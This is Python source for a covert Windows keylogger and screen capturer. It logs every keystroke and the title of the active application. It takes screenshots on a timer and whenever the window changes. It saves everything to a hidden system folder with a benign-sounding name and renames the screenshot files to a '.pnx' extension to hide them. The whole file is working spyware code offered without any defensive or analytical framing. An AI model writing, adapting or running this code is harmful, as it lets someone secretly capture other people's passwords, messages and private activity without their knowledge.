import os
import shutil
from os import path
import autopy
import datetime
from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
#from configparser import ConfigParser

#parser = ConfigParser()
#parser.read('sysconfig.ini')

__version__ = '2.1.0'       # parser.get('System Configuration', 'version')
key_counter = 100            # parser.getint('System Configuration', 'key_counter')     # Number of characters to capture before writing to the file
screen_timer = 15           # parser.getint('System Configuration', 'screen_timer')   # Amount of time in seconds before the screen is captured
exit_string = '<192>'       # parser.get('System Configuration', 'exit_string')     # Key combinations to exit program --  <192> is ctrl key + `

save_path = 'c:\syscapture'  # parser.get('Files', 'save_path')
log_file_name = 'syscapture.txt'          # parser.get('Files', 'log_file_name')

count = 0
png_count = 0
storedTime = datetime.datetime.utcnow()
storedWindow = GetWindowText(GetForegroundWindow())
keys = []


def write_file(keys_captured):
    global storedWindow, exit_string
    keys_to_write = ""

    if not os.path.exists(save_path):
        os.mkdir(save_path)
        os.system('attrib +h +s ' + save_path)

    # Will create the file if it does not exist otherwise append
    with open(os.path.join(save_path, log_file_name), 'a+') as f:

        f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\t")

        if len(keys_captured) != 0:
            for each_key in keys_captured:
                keys_to_write += each_key

        f.write(keys_to_write)
        f.write("\n")

        keys.clear()  # Reset the key list


def write_screen():
    global png_count, save_path, log_file_name, storedTime

    img = autopy.bitmap.capture_screen()
    png_count += 1

    formatted_time = datetime.datetime.strptime((storedTime.strftime("%Y-%m-%d %H:%M:%S.%f"))[:-7], "%Y-%m-%d %H:%M:%S")
    img_file_name = str(formatted_time).replace(":", ".") + "_%s.png" % png_count

    try:
        # img_file_and_path = os.path.join(save_path, log_file_name)
        img.save(os.path.join(save_path, img_file_name))
    except IOError:
        print("IOError with image")
    except ValueError:
        print("ValueError with image")

    # Reset the screen_timer each time the screen is saved
    storedTime = datetime.datetime.utcnow()

    try:
        if path.exists(os.path.join(save_path, img_file_name)):
            newname = (os.path.join(save_path, img_file_name)[:-3] + "pnx")
            shutil.move(os.path.join(save_path, img_file_name), newname)  # Renames the file

    except OSError:
        print("OSError renaming file")
    except ValueError:
        print("ValueError renaming file")


def on_press(key):
    global keys, count, storedTime, screen_timer, key_counter, storedWindow, png_count

    if str(key) == "Key.space":
        key = " "
    if str(key) == "Key.enter":
        key = "<enter>"
    if str(key) == "Key.shift":
        key = ""
    if str(key) == "Key.shift_r":
        key = ""
    if str(key) == "Key.backspace":
        key = ""
        if len(keys) > 0:
            keys = keys[:-1]
    if str(key) == "Key.alt_l":
        key = ""
    if str(key) == "Key.delete":
        key = " <del> "
    if str(key) == "Key.tab":
        key = " <tab> "
    if str(key) == "Key.ctrl_l":
        key = " <ctrl> "
    if str(key) == "Key.right":
        key = " <Arrow_Right> "
    if str(key) == "Key.left":
        key = " <Arrow_Left> "
    if str(key) == "Key.up":
        key = " <Arrow_Up> "
    if str(key) == "Key.down":
        key = " <Arrow_Down> "
    if str(key) == "Key.tab":
        key = " <tab> "
    if str(key) == "Key.caps_lock":
        key = " <caps_lock> "
    if str(key) == "Key.alt_l":
        key = " <alt left> "
    if str(key) == "Key.alt_r":
        key = " <alt right> "
    if str(key) == "Key.media_volume_up" or str(key) == "Key.media_volume_down":
        key = " <Volume Up/Down> "

    keys.append(str(key).replace("'", ""))

    # Check for exit key combinations
    if exit_string in str(keys):
        keys.append("\n\n")
        write_file(keys)            # write any extra keys before exiting
        write_file(["Normal Exit"])
        return False

    if len(keys) >= key_counter:
        write_file(keys)

    # Capture Screen interval based on configured 'screen_timer' delay in seconds
    s = storedTime.strftime("%Y-%m-%d %H:%M:%S.%f")
    storedtime_plus_delay = (datetime.datetime.strptime(s[:-7], "%Y-%m-%d %H:%M:%S")) + datetime.timedelta(seconds=screen_timer)

    if datetime.datetime.utcnow() >= storedtime_plus_delay:
        write_screen()
    # check the active window to see if we are still typing in the same application
    # between keystrokes.  There is a chance that the application name would not get logged depending on the write_delay

    if GetWindowText(GetForegroundWindow()) != storedWindow:
        keys.append("\n\n<application> " + str(GetWindowText(GetForegroundWindow()) + " <application>"))
        # write_file will wipe out the keys, so sending keys here to log before writing the new window name
        write_file(keys)
        storedWindow = GetWindowText(GetForegroundWindow())  # update storedWindow to the new name of the application

        # if the application focus changes, grab the screen
        write_screen()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


